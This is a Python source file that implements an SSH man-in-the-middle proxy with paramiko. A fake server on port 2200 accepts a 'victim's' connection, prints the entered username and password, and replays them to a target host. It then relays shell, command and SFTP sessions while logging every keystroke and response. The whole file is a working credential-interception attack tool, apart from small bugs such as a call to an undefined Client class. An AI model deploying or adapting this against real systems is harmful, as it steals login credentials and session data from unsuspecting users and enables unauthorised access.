import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import time
import paramiko
from paramiko.py3compat import b, u, decodebytes

paramiko.util.log_to_file("log")
TARGET = '192.168.1.2'
Host_key = paramiko.RSAKey(filename="./rsa")
DoGSSAPIKeyExchange = True



def window_shell(chanUser,chanServer):
    import threading
    print("start shell")
    def writeall(sockUser, sockServer):
        s = ''
        while True:
            try:
                data = sockServer.recv(256)
                s += data
            except socket.timeout:
                continue
            if not data:
                sys.stdout.write("\r\n*** EOF ***\r\n\r\n")
                sys.stdout.flush()
                sockUser.close() # disallowed recieve and send
                break
            # output
            if '\n' in s:
                print('<'+s)
                s = ''
            sockUser.sendall(data)

    writer = threading.Thread(target=writeall, args=(chanUser, chanServer))
    writer.start()
    string = ''
    while True:
        try:
            d = chanUser.recv(1)
            string += d
        except socket.timeout:
            continue
        except EOFError:
            break

        if not d:
            break

        # output
        if '\n' in string:
            print('>'+string)
            string = ''
        try:
            chanServer.send(d)
        except:
            break
    print("shell exit!")

class FakeClient(object):
    """This class is used to connect to target server.
    To use this class, make sure local know_hosts didn't store target's public key.
    If you want to implement more types, check paramiko's client.py, transport.py, channel.py
    to make sure you know what to return and what to do.
    """
    def __init__(self):
        """Init a normal sshclient().It will create a socket without connect.
        """
        global TARGET
        self.hostname = TARGET
        client = paramiko.SSHClient()
        self.client = client
        client.load_system_host_keys() # this may cause problem if target's pubkey is different from our stored server pubkey.
        client.set_missing_host_key_policy(paramiko.WarningPolicy())
        self.pty = []

    def agent_auth(self, username, password = '', key = None, port=22):
        """We can't fake a key authentication because of session identify used in negotiation
        """
        if key:
            print("We can't support key authenticate.")
            return False

        else:
            try:
                self.client.connect(
                    self.hostname, 
                    port, 
                    username, 
                    password
                    )
                return True

            except Exception as e:
                print("@Auth Fail:", e)
                return False

    def request_pty(self, term,
        width, height, pixelwidth, pixelheight,
        modes
        ):
        self.pty = [term, width, height,
            pixelwidth, pixelheight, modes]

    def invoke_shell(self):
        if len(self.pty):
            return self.client.invoke_shell(
                self.pty[0],
                self.pty[1],
                self.pty[2],
                self.pty[3],
                self.pty[4]
                )
        return self.client.invoke_shell()

    def exec_command(self, command):
        transport = self.client.get_transport()
        chan = transport.open_session()
        # if get_pty:
        #     chan.get_pty()
        # chan.settimeout(timeout)
        # if environment:
        #     chan.update_environment(environment)
        chan.exec_command(command)
        return chan

    def open_sftp(self):
        return self.client.open_sftp()

    def close(self):
        if self.client:
            self.client.close()


class Server(paramiko.ServerInterface):
    """A fake Server Class for accepting victim's connection"""
    def __init__(self, fakeClient):
        self.event = threading.Event()
        self.fakeClient = fakeClient
        self.fakeClient_chan = None
        self.server_chan = None
        self.sftpClient = None

    def set_chan(self, channel):
        self.server_chan = channel

    def run(self):
        self.server_chan.settimeout(2)
        if self.sftpClient:
            self.fakeClient_chan = self.sftpClient.get_channel()

        if not self.fakeClient_chan:
            print("@No fake channel")
            return

        self.fakeClient_chan.settimeout(2)
        window_shell(
            self.server_chan, 
            self.fakeClient_chan
            )

    def close(self):
        if self.sftpClient:
            self.sftpClient.close()

        elif self.fakeClient_chan:
            self.fakeClient_chan.close()

        self.fakeClient.close()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_publickey(self, username, key):
        """We can't fake publickey connection, remember to avoid this."""
        return paramiko.AUTH_FAILED

    def check_auth_password(self, user, pswd):
        print(user,pswd)
        try:
            ret = self.fakeClient.agent_auth(user,pswd)
            if ret:
                return paramiko.AUTH_SUCCESSFUL

        except Exception as e:
            print(e)
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_with_mic(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_keyex(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def enable_auth_gssapi(self):
        return True

    def get_allowed_auths(self, username):
        return "gssapi-keyex,gssapi-with-mic,password,publickey"

    def check_channel_shell_request(self, channel):
        print("invoke_shell")
        fakeClient_chan = self.fakeClient.invoke_shell()
        if fakeClient_chan:
            self.fakeClient_chan = fakeClient_chan
            self.event.set()
            return True
        
        return paramiko.AUTH_FAILED

    def check_channel_exec_request(self, channel, command):
        print("exec", command)
        self.fakeClient_chan = self.fakeClient.exec_command(command)
        self.event.set()
        return True

    def check_channel_pty_request(
        self, channel, term, width, height, pixelwidth, pixelheight, modes
    ):
        print("request pty")
        self.fakeClient.request_pty(
            term,
            width,
            height,
            pixelwidth,
            pixelheight,
            modes)
        return True

    def check_channel_subsystem_request(
        self, channel, name
    ):
        print("request subsystem", name)
        if name == 'sftp':
            try:
                self.sftpClient = self.fakeClient.open_sftp()
            except Exception as e:
                print(e)
            self.event.set()
            return True
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    # following function we don't support.
    def check_channel_window_change_request(
        self, channel, width, height, pixelwidth, pixelheight
    ):
        print("request window change")
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_x11_request(
        self,
        channel,
        single_connection,
        auth_protocol,
        auth_cookie,
        screen_number,
    ):
        print("request x11")
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_forward_agent_request(self, channel):
        print("forward agent")
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

class Connection(threading.Thread):
    """Handle New connection"""
    def __init__(self, client, host_key):
        self.client = client
        self.host_key = host_key
        super(Connection, self).__init__()

    def run(self):
        global DoGSSAPIKeyExchange

        t = paramiko.Transport(self.client, gss_kex=DoGSSAPIKeyExchange)
        t.set_gss_host(socket.getfqdn(""))
        try:
            t.load_server_moduli()
        except:
            print("(Failed to load moduli -- gex will be unsupported.)")
            raise
        t.add_server_key(self.host_key)

        fakeClient = Client()
        server = Server(fakeClient)
        
        try:
            t.start_server(server=server)
        except paramiko.SSHException:
            print("*** SSH negotiation failed.")
            sys.exit(1)

        # wait for auth
        chan = t.accept(20)
        if chan is None:
            print("*** No channel.")
            sys.exit(1)
        print("Authenticated!")

        server.event.wait(10)
        if not server.event.is_set():
            print("*** Client never asked for a shell.")
            sys.exit(1)
        server.set_chan(chan)
        server.run()
        # chan channel is closed by windows_shell function.
        server.close()



if __name__ == '__main__':
    print("Read key: " + u(hexlify(Host_key.get_fingerprint())))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", 2200))
        sock.listen(100)
        sock.settimeout(2)
    except Exception as e:
        print("*** Bind failed: " + str(e))
        traceback.print_exc()
        sys.exit(1)

    print("Listening for connection ...")
    while 1:
        try:
            try:
                sockclient, addr = sock.accept()
            except socket.timeout:
                continue
            conn = Connection(sockclient, Host_key)
            conn.start()

        except socket.timeout:
            print("*** Listen/accept failed: " + str(e))
            traceback.print_exc()
            sys.exit(1)

